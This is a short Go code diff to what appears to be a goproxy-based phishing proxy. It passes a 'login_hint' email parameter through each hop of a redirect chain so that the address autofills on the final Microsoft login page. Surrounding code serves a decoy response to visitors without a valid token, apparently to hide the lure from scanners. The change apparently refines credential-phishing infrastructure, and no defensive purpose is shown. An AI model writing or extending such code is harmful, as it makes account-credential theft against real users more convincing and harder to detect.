@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 
 	"github.com/elazarl/goproxy"
@@ -124,6 +125,15 @@ func handleRedirectChainRequest(req *http.Request, secret []byte) (bool, *http.R
 		log.Warning("redirect chain: invalid token from %s: %v", req.RemoteAddr, err)
 		rq, rs := DecoyResponse(req)
 		return true, rq, rs
+	}
+
+	// Propagate login_hint through each hop so the email autofills on the final MS login page.
+	if hint := req.URL.Query().Get("login_hint"); hint != "" {
+		sep := "?"
+		if strings.Contains(nextURL, "?") {
+			sep = "&"
+		}
+		nextURL += sep + "login_hint=" + url.QueryEscape(hint)
 	}
 
 	log.Debug("redirect chain hop: %s → %s", req.RemoteAddr, nextURL)
